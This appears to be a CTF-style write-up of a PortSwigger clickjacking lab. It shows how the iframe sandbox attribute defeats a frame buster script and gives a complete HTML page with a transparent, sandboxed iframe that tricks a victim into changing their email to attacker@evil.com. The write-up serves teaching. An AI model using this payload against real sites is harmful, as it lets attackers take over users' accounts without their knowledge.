# Clickjacking with a frame buster script

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/clickjacking/lab-frame-buster-script), you'll learn: Clickjacking with a frame buster script! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a [clickjacking attack](https://portswigger.net/web-security/clickjacking) that changes the users email address?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Clickjacking/Clickjacking-3/images/Pasted%20image%2020230102054510.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Clickjacking/Clickjacking-3/images/Pasted%20image%2020230102054521.png)

**View source page:**
```html
<div id=account-content>
    <p>Your username is: wiener</p>
    <p>Your email is: wiener@normal-user.net</p>
    <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
        <label>Email</label>
        <input required type="email" name="email" value="">
        <script>
        if(top != self) {
            window.addEventListener("DOMContentLoaded", function() {
                document.body.innerHTML = 'This page cannot be framed';
            }, false);
        }
        </script>
        <input required type="hidden" name="csrf" value="I0MsiFo62jqwQWve8ihfuOe1milL4ixH">
        <button class='button' type='submit'> Update email </button>
    </form>
</div>
```

In here, we see a JavaScript code is **checking the current application window is the main or top window.**

**If it's not on the top window, the application rejects and not allow to be framed.** This technique is called "Frame busting".

**To bypass that, we can use the HTML5 iframe `sandbox` attribute:**
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```

When this is set with the `allow-forms` or `allow-scripts` values and **the `allow-top-navigation` value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window.**

Armed with above information, we can **create a fake website that fools the user into changing their email address** by clicking on "Click me".

First, we need to **prepopulate the email addres**.

**To do so, we can provide a GET parameter: `email`.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Clickjacking/Clickjacking-3/images/Pasted%20image%2020230102055156.png)

**Then, we can crafte a fake website manually:**
```html
<html>
    <head>
        <title>Clickjacking with a frame buster script</title>
        <style type="text/css">
            #targetWebsite {
                position:relative;
                width:700px;
                height:700px;
                opacity:0.0001;
                z-index:2;
            }

            #decoyWebsite {
                position:absolute;
                top:450px;
                left:75px;
                z-index:1;
            }
        </style>
    </head>
    <body>
        <div id="decoyWebsite">Click me</div>
        <iframe id="targetWebsite" src="https://0a42009803148543c6bc3f00000d00f0.web-security-academy.net/my-account?email=attacker@evil.com" sandbox="allow-forms"></iframe>
    </body>
</html>
```

**Finally, go to exploit server to host the payload, and deliver to victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Clickjacking/Clickjacking-3/images/Pasted%20image%2020230102060724.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Clickjacking/Clickjacking-3/images/Pasted%20image%2020230102060729.png)

Nice!

# What we've learned:

1. Clickjacking with a frame buster script